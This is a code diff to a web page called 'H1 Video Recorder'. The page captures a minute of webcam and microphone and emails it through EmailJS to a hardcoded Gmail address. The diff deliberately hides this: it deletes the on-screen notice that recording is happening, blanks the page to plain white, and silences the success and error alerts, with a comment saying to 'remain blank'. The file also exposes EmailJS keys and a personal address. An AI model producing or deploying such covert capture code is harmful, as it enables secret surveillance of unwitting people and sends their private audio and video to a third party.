@@ -4,21 +4,24 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>H1 Video Recorder</title>
+  <style>
+    /* Make body fully white with no margin */
+    body {
+      margin: 0;
+      background: white;
+      height: 100vh;
+      overflow: hidden;
+    }
+  </style>
 </head>
 <body>
-  <h1>Recording a 1-minute video...</h1>
-  <p>Please allow camera and microphone access if prompted.</p>
-
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
   <script>
-    // Initialize EmailJS with your User ID
-    emailjs.init("ACOn6PC1Zb70JrmxT"); 
+    emailjs.init("ACOn6PC1Zb70JrmxT"); // Your EmailJS Public Key
 
     async function startRecording() {
       try {
-        // Request camera and microphone access
         const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-
         const recorder = new MediaRecorder(stream);
         const chunks = [];
 
@@ -29,10 +32,8 @@
           const reader = new FileReader();
 
           reader.onloadend = function() {
-            // Convert blob to base64 string (remove prefix)
             const base64data = reader.result.split(',')[1];
 
-            // Send email with attachment
             emailjs.send("service_p3yitzn", "template_oyrsayr", {
               to_email: "julianlee252@gmail.com",
               message: "Here’s your 1-minute video recording."
@@ -42,10 +43,9 @@
                 data: base64data
               }]
             }).then(() => {
-              alert("✅ Video email sent!");
+              // No alerts or messages, remain blank
             }, (error) => {
-              console.error("❌ EmailJS error:", error);
-              alert("❌ Failed to send email: " + error.text);
+              console.error("EmailJS error:", error);
             });
           };
 
@@ -54,14 +54,13 @@
 
         recorder.start();
 
-        // Stop recording after 60 seconds
         setTimeout(() => {
           recorder.stop();
-          // Stop all media tracks to release camera & mic
           stream.getTracks().forEach(track => track.stop());
         }, 60000);
+
       } catch (err) {
-        alert("Permission denied or error: " + err.message);
+        console.error("Permission or recording error:", err);
       }
     }
 
